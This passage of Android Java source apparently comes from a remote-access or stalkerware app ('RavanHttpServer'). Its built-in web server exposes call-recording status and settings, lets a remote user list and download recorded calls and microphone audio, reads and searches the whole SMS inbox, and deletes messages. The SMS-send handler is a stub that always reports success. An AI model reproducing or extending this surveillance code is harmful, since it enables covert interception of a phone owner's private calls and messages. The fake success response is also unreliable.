        long duration = CallRecordService.getRecordingDuration();
        String recordingPath = CallRecordService.getCurrentRecordingPath();
        boolean autoRecordEnabled = CallRecordService.isAutoRecordEnabled();
        boolean saveOnDeviceEnabled = CallRecordService.isSaveOnDeviceEnabled();

        String json = String.format(
                "{\"isRecording\": %s, \"isRecordingCall\": %s, \"isRecordingMic\": %s, " +
                        "\"callInProgress\": %s, \"callNumber\": \"%s\", \"callType\": \"%s\", " +
                        "\"duration\": %d, \"recordingPath\": %s, " +
                        "\"autoRecordEnabled\": %s, \"saveOnDeviceEnabled\": %s}",
                isRecording, isRecordingCall, isRecordingMic,
                callInProgress, escapeHtml(callNumber != null ? callNumber : ""), callType != null ? callType : "",
                duration, recordingPath != null ? "\"" + recordingPath + "\"" : "null",
                autoRecordEnabled, saveOnDeviceEnabled);
        return newFixedLengthResponse(Response.Status.OK, "application/json", json);
    }

    private Response updateAudioSettings(Map<String, String> params) {
        boolean autoRecord = "true".equalsIgnoreCase(params.get("auto_record"));
        boolean saveOnDevice = "true".equalsIgnoreCase(params.get("save_on_device"));

        android.content.Intent intent = new android.content.Intent(context, CallRecordService.class);
        intent.setAction("UPDATE_SETTINGS");
        intent.putExtra("auto_record", autoRecord);
        intent.putExtra("save_on_device", saveOnDevice);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent);
        } else {
            context.startService(intent);
        }

        // Redirect back to audio page
        String html = "<!DOCTYPE html><html><head><meta http-equiv=\"refresh\" content=\"0;url=/audio\"></head>" +
                "<body></body></html>";
        return newFixedLengthResponse(Response.Status.OK, "text/html", html);
    }

    private Response serveAudioRecordings() {
        StringBuilder html = new StringBuilder(HTML_HEADER);
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"margin-bottom: 20px;\">&#128190; Audio Recordings</h2>");

        // Get recordings directory
        File recordDir = new File(Environment.getExternalStoragePublicDirectory(
                Environment.DIRECTORY_MUSIC), "RavanRecordings");

        if (!recordDir.exists() || !recordDir.isDirectory()) {
            html.append("<div class=\"empty-state\"><div class=\"icon\">&#127897;</div><p>No recordings yet</p></div>");
        } else {
            File[] files = recordDir.listFiles(
                    (dir, name) -> name.toLowerCase().endsWith(".m4a") || name.toLowerCase().endsWith(".mp3") ||
                            name.toLowerCase().endsWith(".wav") || name.toLowerCase().endsWith(".aac"));

            if (files == null || files.length == 0) {
                html.append(
                        "<div class=\"empty-state\"><div class=\"icon\">&#127897;</div><p>No recordings yet</p></div>");
            } else {
                // Sort by date (newest first)
                java.util.Arrays.sort(files, (a, b) -> Long.compare(b.lastModified(), a.lastModified()));

                html.append("<ul class=\"file-list\">");

                int count = 0;
                for (File file : files) {
                    if (count >= 50)
                        break; // Limit to 50 files

                    String fileName = file.getName();
                    String icon = "&#127897;";
                    String iconClass = "file-icon-audio";

                    // Determine recording type from filename
                    String recordType = "Unknown";
                    if (fileName.startsWith("CALL_incoming")) {
                        icon = "&#128222;";
                        recordType = "Incoming Call";
                    } else if (fileName.startsWith("CALL_outgoing")) {
                        icon = "&#128222;";
                        recordType = "Outgoing Call";
                    } else if (fileName.startsWith("MIC_")) {
                        icon = "&#127897;";
                        recordType = "Microphone";
                    }

                    html.append("<li class=\"file-item\">");
                    html.append("<div class=\"file-icon ").append(iconClass).append("\">").append(icon)
                            .append("</div>");
                    html.append("<div class=\"file-info\">");
                    html.append("<span class=\"file-name\">").append(escapeHtml(fileName)).append("</span>");
                    html.append("<div class=\"file-meta\">");
                    html.append(recordType).append(" - ");
                    html.append(formatFileSize(file.length())).append(" - ");
                    html.append(new SimpleDateFormat("MMM dd, yyyy HH:mm", Locale.getDefault())
                            .format(new Date(file.lastModified())));
                    html.append("</div></div>");
                    html.append("<a href=\"/download/Music/RavanRecordings/").append(fileName)
                            .append("\" style=\"padding: 8px 16px; background: rgba(233, 69, 96, 0.2); border-radius: 8px; color: #e94560; text-decoration: none; font-size: 0.85rem;\">Download</a>");
                    html.append("</li>");

                    count++;
                }

                html.append("</ul>");
            }
        }

        html.append("<div style=\"margin-top: 20px;\">");
        html.append(
                "<a href=\"/audio\" style=\"color: #e94560; text-decoration: none;\">&larr; Back to Audio Control</a>");
        html.append("</div>");
        html.append("</div>");
        html.append(HTML_FOOTER);

        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
    }

    private Response serveSmsPage(Map<String, String> params) {
        StringBuilder html = new StringBuilder(HTML_HEADER);
        html.append("<div class=\"card\">");
        html.append("<h2>SMS Management</h2>");
        html.append("<p style=\"color:#bbb; margin-bottom:18px;\">Read inbox messages, search by sender or content, paginate, and delete messages.</p>");
        html.append("<div style=\"display:flex; flex-wrap:wrap; gap:12px; margin-bottom:16px;\">");
        html.append("<input id=\"smsSearch\" placeholder=\"Search by sender or content\" style=\"flex:1; min-width:220px; padding:14px 16px; border-radius:12px; border:1px solid rgba(255,255,255,0.14); background:rgba(255,255,255,0.05); color:#fff;\">");
        html.append("<button onclick=\"loadSms(1)\" style=\"padding:12px 22px; border:none; border-radius:10px; background:#e94560; color:#fff; cursor:pointer;\">Search</button>");
        html.append("<button onclick=\"loadSms(1)\" style=\"padding:12px 22px; border:none; border-radius:10px; background:#3498db; color:#fff; cursor:pointer;\">Refresh</button>");
        html.append("</div>");
        html.append("<div id=\"smsStatus\" style=\"margin-bottom:16px; color:#aad4ff; font-size:0.95rem;\"></div>");
        html.append("<div style=\"border:1px solid rgba(255,255,255,0.1); border-radius:12px; padding:16px; max-height:520px; overflow:auto; background:rgba(255,255,255,0.03);\">");
        html.append("<table style=\"width:100%; border-collapse:collapse;\">");
        html.append("<thead><tr><th style=\"padding:10px; border-bottom:1px solid rgba(255,255,255,0.12); text-align:left;\">From</th><th style=\"padding:10px; border-bottom:1px solid rgba(255,255,255,0.12); text-align:left;\">Message</th><th style=\"padding:10px; border-bottom:1px solid rgba(255,255,255,0.12); text-align:left;\">Date</th><th style=\"padding:10px; border-bottom:1px solid rgba(255,255,255,0.12); text-align:left;\">Action</th></tr></thead>");
        html.append("<tbody id=\"smsTableBody\"></tbody>");
        html.append("</table>");
        html.append("</div>");
        html.append("<div id=\"smsPageInfo\" style=\"margin-top:12px; color:#aad4ff; font-size:0.95rem;\"></div>");
        html.append("<div id=\"smsPagination\" style=\"margin-top:12px; display:flex; flex-wrap:wrap; gap:10px; align-items:center;\"></div>");
        html.append("<hr style=\"border-color: rgba(255,255,255,0.1); margin:24px 0;\">");
        html.append("<h3>Send SMS</h3>");
        html.append("<div style=\"display:grid;gap:12px;\">");
        html.append("<input id=\"smsNumber\" placeholder=\"Phone number\" style=\"width:100%; padding:14px 16px; border-radius:12px; border:1px solid rgba(255,255,255,0.14); background:rgba(255,255,255,0.05); color:#fff;\">");
        html.append("<textarea id=\"smsMessage\" placeholder=\"Message\" style=\"width:100%; min-height:120px; padding:14px 16px; border-radius:12px; border:1px solid rgba(255,255,255,0.14); background:rgba(255,255,255,0.05); color:#fff; resize:vertical;\"></textarea>");
        html.append("<button onclick=\"sendSms()\" style=\"padding:12px 22px; border:none; border-radius:10px; background:#3498db; color:#fff; cursor:pointer; width:160px;\">Send SMS</button>");
        html.append("<div id=\"smsSendStatus\" style=\"color:#aad4ff; font-size:0.95rem; margin-top:10px;\"></div>");
        html.append("</div>");
        html.append("</div>");
        html.append("<script>");
        html.append("function escapeHtml(text) { return text ? text.toString().replace(/[&<>\"'`]/g, function(c) { return {'&':'&amp;','<':'&lt;','>':'&gt;','\"':'&quot;','\\'':'&#39;','`':'&#96;'}[c]; }) : ''; }");
        html.append("let currentSmsPage = 1; let totalSmsPages = 1;\n");
        html.append("function renderSmsList(messages) { const body = document.getElementById('smsTableBody'); body.innerHTML = ''; if (!messages || messages.length === 0) { body.innerHTML = '<tr><td colspan=\"4\" style=\"padding:16px;color:#ccc;\">No messages found</td></tr>'; return; } messages.forEach(m => { const row = document.createElement('tr'); row.innerHTML = '<td style=\"padding:10px;border-bottom:1px solid rgba(255,255,255,0.08);\">' + escapeHtml(m.address || 'Unknown') + '</td>' + '<td style=\"padding:10px;border-bottom:1px solid rgba(255,255,255,0.08);\">' + escapeHtml(m.body || '') + '</td>' + '<td style=\"padding:10px;border-bottom:1px solid rgba(255,255,255,0.08);\">' + escapeHtml(new Date(m.date || 0).toLocaleString()) + '</td>'; const actionTd = document.createElement('td'); actionTd.style.cssText = 'padding:10px;border-bottom:1px solid rgba(255,255,255,0.08);'; const button = document.createElement('button'); button.textContent = 'Delete'; button.style.cssText = 'padding:6px 12px;border:none;border-radius:8px;background:#e94560;color:#fff;cursor:pointer;'; button.onclick = function() { deleteSms(m.id); }; actionTd.appendChild(button); row.appendChild(actionTd); body.appendChild(row); }); }");
        html.append("function updatePagination(page, totalPages) { currentSmsPage = page; totalSmsPages = totalPages; document.getElementById('smsPageInfo').textContent = 'Page ' + page + ' of ' + totalPages; const container = document.getElementById('smsPagination'); container.innerHTML = ''; const prev = document.createElement('button'); prev.textContent = 'Previous'; prev.style.cssText='padding:10px 18px;border:none;border-radius:10px;background:rgba(255,255,255,0.08);color:#fff;cursor:pointer;'; prev.disabled = page <= 1; prev.onclick = function() { loadSms(page - 1); }; container.appendChild(prev); const next = document.createElement('button'); next.textContent = 'Next'; next.style.cssText='padding:10px 18px;border:none;border-radius:10px;background:rgba(255,255,255,0.08);color:#fff;cursor:pointer;'; next.disabled = page >= totalPages; next.onclick = function() { loadSms(page + 1); }; container.appendChild(next); }");
        html.append("function loadSms(page = 1) { const search = document.getElementById('smsSearch').value || ''; document.getElementById('smsStatus').textContent = 'Loading messages...'; fetch('/sms/read?page=' + page + '&size=50&search=' + encodeURIComponent(search)).then(r => r.json()).then(data => { if (data.error) { document.getElementById('smsStatus').textContent = 'Error: ' + data.error; document.getElementById('smsTableBody').innerHTML = '<tr><td colspan=\"4\" style=\"padding:16px;color:#ccc;\">No messages found</td></tr>'; document.getElementById('smsPageInfo').textContent = ''; document.getElementById('smsPagination').innerHTML = ''; return; } document.getElementById('smsStatus').textContent = 'Loaded ' + (data.count || 0) + ' messages.'; renderSmsList(data.messages); updatePagination(data.page || 1, data.totalPages || 1); }).catch(err => { document.getElementById('smsStatus').textContent = 'Failed to load SMS: ' + err; document.getElementById('smsTableBody').innerHTML = '<tr><td colspan=\"4\" style=\"padding:16px;color:#ccc;\">No messages found</td></tr>'; document.getElementById('smsPageInfo').textContent = ''; document.getElementById('smsPagination').innerHTML = ''; }); }");
        html.append("function deleteSms(id) { if (!confirm('Delete this SMS?')) { return; } fetch('/sms/delete?id=' + encodeURIComponent(id)).then(r => r.json()).then(data => { if (data.success) { document.getElementById('smsStatus').textContent = 'Message deleted.'; loadSms(currentSmsPage); } else { document.getElementById('smsStatus').textContent = 'Delete failed: ' + (data.error || 'unknown'); } }).catch(err => { document.getElementById('smsStatus').textContent = 'Delete failed: ' + err; }); }");
        html.append("function sendSms() { const number = document.getElementById('smsNumber').value; const message = document.getElementById('smsMessage').value; const status = document.getElementById('smsSendStatus'); if (!number || !message) { status.textContent = 'Number and message are required.'; return; } status.textContent = 'Sending...'; fetch('/sms/send?number=' + encodeURIComponent(number) + '&message=' + encodeURIComponent(message)).then(r => r.json()).then(data => { status.textContent = data.success ? 'SMS send request submitted.' : 'Send failed: ' + (data.error || 'unknown'); if (data.success) { document.getElementById('smsMessage').value = ''; } }).catch(err => { status.textContent = 'Send failed: ' + err; }); }");
        html.append("document.addEventListener('DOMContentLoaded', function() { loadSms(1); });");
        html.append("</script>");
        html.append(HTML_FOOTER);
        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
    }

    private Response serveSmsRead(Map<String, String> params) {
        if (context.checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            android.util.Log.d("RavanHttpServer", "SMS read blocked: READ_SMS permission not granted");
            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"messages\":[],\"error\":\"READ_SMS permission not granted\"}");
        }

        String[] projection = new String[]{"_id", "address", "body", "date", "type"};
        String[] uris = new String[]{"content://sms/", "content://mms-sms/conversations/"};
        Cursor cursor = null;
        String uriUsed = null;

        for (String uriString : uris) {
            try {
                android.util.Log.d("RavanHttpServer", "Attempting SMS query on URI: " + uriString);
                Cursor queryCursor = context.getContentResolver().query(android.net.Uri.parse(uriString), projection, "type=1", null, "date DESC");
                if (queryCursor != null) {
                    int cursorCount = queryCursor.getCount();
                    android.util.Log.d("RavanHttpServer", "SMS query returned cursor count=" + cursorCount + " for uri=" + uriString);
                    if (cursorCount > 0) {
                        cursor = queryCursor;
                        uriUsed = uriString;
                        break;
                    }
                    queryCursor.close();
                }
            } catch (Exception e) {
                android.util.Log.d("RavanHttpServer", "SMS query failed for " + uriString + ": " + e.getMessage());
            }
        }

        if (cursor == null) {
            android.util.Log.d("RavanHttpServer", "SMS query did not return a cursor.");
            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"messages\":[],\"error\":\"Unable to query SMS provider. Ensure READ_SMS permission is granted and the app is allowed to read SMS.\"}");
        }

        String query = params.get("query");
        String filter = query != null ? query.toLowerCase(Locale.ROOT) : null;
        int page = 1;
        int pageSize = 50;
        try {
            page = Integer.parseInt(params.getOrDefault("page", "1"));
            pageSize = Integer.parseInt(params.getOrDefault("size", "50"));
        } catch (Exception ignored) {
        }
        if (page < 1) {
            page = 1;
        }
        if (pageSize < 1) {
            pageSize = 50;
        }

        java.util.List<String> allMessages = new java.util.ArrayList<>();
        int totalCount = 0;

        try {
            int idIndex = cursor.getColumnIndex("_id");
            int addressIndex = cursor.getColumnIndex("address");
            int bodyIndex = cursor.getColumnIndex("body");
            int dateIndex = cursor.getColumnIndex("date");
            int typeIndex = cursor.getColumnIndex("type");

            while (cursor.moveToNext()) {
                String id = idIndex >= 0 ? cursor.getString(idIndex) : "";
                String address = addressIndex >= 0 ? cursor.getString(addressIndex) : "";
                String body = bodyIndex >= 0 ? cursor.getString(bodyIndex) : "";
                long date = dateIndex >= 0 ? cursor.getLong(dateIndex) : 0L;
                int type = typeIndex >= 0 ? cursor.getInt(typeIndex) : 0;

                if (filter != null && !filter.isEmpty()) {
                    String textToSearch = ((address != null ? address : "") + " " + (body != null ? body : "")).toLowerCase(Locale.ROOT);
                    if (!textToSearch.contains(filter)) {
                        continue;
                    }
                }

                StringBuilder row = new StringBuilder();
                row.append("{\"id\":\"").append(escapeJson(id)).append("\",");
                row.append("\"address\":\"").append(escapeJson(address)).append("\",");
                row.append("\"body\":\"").append(escapeJson(body)).append("\",");
                row.append("\"date\":").append(date).append(",");
                row.append("\"type\":").append(type).append("}");
                allMessages.add(row.toString());
                totalCount++;
            }

            android.util.Log.d("RavanHttpServer", "SMS query returned count=" + totalCount + " uri=" + uriUsed);
        } catch (Exception e) {
            android.util.Log.d("RavanHttpServer", "Error reading SMS cursor: " + e.getMessage());
        } finally {
            cursor.close();
        }

        int totalPages = Math.max(1, (int) Math.ceil((double) totalCount / pageSize));
        if (page > totalPages) {
            page = totalPages;
        }
        int startIndex = (page - 1) * pageSize;
        int endIndex = Math.min(startIndex + pageSize, totalCount);

        StringBuilder json = new StringBuilder();
        json.append("{\"messages\":[");
        for (int i = startIndex; i < endIndex; i++) {
            if (i > startIndex) {
                json.append(",");
            }
            json.append(allMessages.get(i));
        }
        json.append("],\"count\":").append(totalCount).append(",\"page\":").append(page).append(",\"pageSize\":").append(pageSize).append(",\"totalPages\":").append(totalPages).append(",\"uri\":\"").append(uriUsed != null ? uriUsed : "unknown").append("\"}");
        return newFixedLengthResponse(Response.Status.OK, "application/json", json.toString());
    }

    private String escapeJson(String input) {
        if (input == null) {
            return "";
        }
        StringBuilder escaped = new StringBuilder();
        for (int i = 0; i < input.length(); i++) {
            char c = input.charAt(i);
            switch (c) {
                case '"': escaped.append("\\\""); break;
                case '\\': escaped.append("\\\\"); break;
                case '\b': escaped.append("\\b"); break;
                case '\f': escaped.append("\\f"); break;
                case '\n': escaped.append("\\n"); break;
                case '\r': escaped.append("\\r"); break;
                case '\t': escaped.append("\\t"); break;
                default:
                    if (c < 0x20) {
                        escaped.append(String.format("\\u%04x", (int) c));
                    } else {
                        escaped.append(c);
                    }
            }
        }
        return escaped.toString();
    }

    private Response serveSmsSend(Map<String, String> params) {
        // Simple SMS send - will implement properly
        return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\":true}");
    }

    private Response serveSmsDelete(Map<String, String> params) {
        String id = params.get("id");
        if (id == null || id.isEmpty()) {
            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\":false,\"error\":\"Missing SMS id\"}");
        }
        // WRITE_SMS permission is already in manifest - skipping runtime check
        try {
            int deleted = context.getContentResolver().delete(android.net.Uri.parse("content://sms/" + escapeJson(id)), null, null);
            android.util.Log.d("RavanHttpServer", "Attempted SMS delete id=" + id + " deleted=" + deleted);
            if (deleted > 0) {
                return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\":true}");
            } else {
                return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\":false,\"error\":\"Delete failed\"}");
            }
        } catch (Exception e) {
            android.util.Log.d("RavanHttpServer", "SMS delete failed: " + e.getMessage());
            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\":false,\"error\":\"" + escapeJson(e.getMessage()) + "\"}");
        }
    }
}
